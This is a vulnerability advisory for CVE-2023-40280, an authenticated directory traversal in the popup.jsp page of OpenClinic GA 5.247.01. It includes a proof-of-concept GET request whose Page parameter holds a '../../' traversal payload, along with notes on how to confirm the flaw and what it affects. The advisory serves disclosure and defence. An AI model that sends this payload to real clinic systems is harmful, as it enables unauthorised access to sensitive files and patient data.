# CVE-2023-40280: Authenticated Directory Path Traversal via popup.jsp in OpenClinic GA 5.247.01
## Abstract
A Directory Path Traversal vulnerability has been identified in OpenClinic GA version 5.247.01, particularly within the popup.jsp component. This vulnerability enables authenticated users to traverse the server's directory structure and access files outside the intended directories through manipulated GET requests.

## Identification
CVE ID: CVE-2023-40280

Exploit Title: Authenticated Directory Path Traversal via popup.jsp in OpenClinic GA 5.247.01

Date Discovered: 2023-08-14

Affected Software: OpenClinic GA version 5.247.01

Vendor: OpenClinic

Software Link: [SourceForge Project Page](https://sourceforge.net/projects/open-clinic/)

Tested Environments: Windows 10, Windows 11

## Vulnerability Details
This vulnerability affects the popup.jsp component of the OpenClinic GA application, allowing authenticated users to perform directory path traversal attacks. Attackers can manipulate GET requests to access files and directories that should not be accessible, potentially leading to the disclosure of sensitive information or the execution of unauthorized actions on the server.

## Proof of Concept (PoC)
  Steps to Reproduce:

    1. Crafting the Malicious GET Request:
      Employ a web browser or a tool capable of sending custom HTTP requests (such as curl or Burp Suite).
      Format the GET request as follows, where ../../main.jsp is used to attempt directory traversal and access main.jsp:
        GET /openclinic/popup.jsp?Page=../../main.jsp&PopupWidth=800&PopupHeight=600&AutoClose=1 HTTP/1.1
        Host: [IP]:10088
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: JSESSIONID=[SESSION ID]
        Upgrade-Insecure-Requests: 1
        
      Replace [IP] with the actual IP address or domain, and [SESSION ID] with a valid session ID from an authenticated user session.

    2. Confirming the Vulnerability:
      If the server responds with the contents of main.jsp or any file outside the intended directory, it confirms the existence of a directory path traversal vulnerability. This access to unauthorized files can result in sensitive information disclosure or more severe attacks.

## Impact
The exploitation of this vulnerability could allow authenticated attackers to access sensitive files or execute actions beyond their authorized permissions. This could lead to data breaches, system compromise, and undermine the integrity and confidentiality of the application.
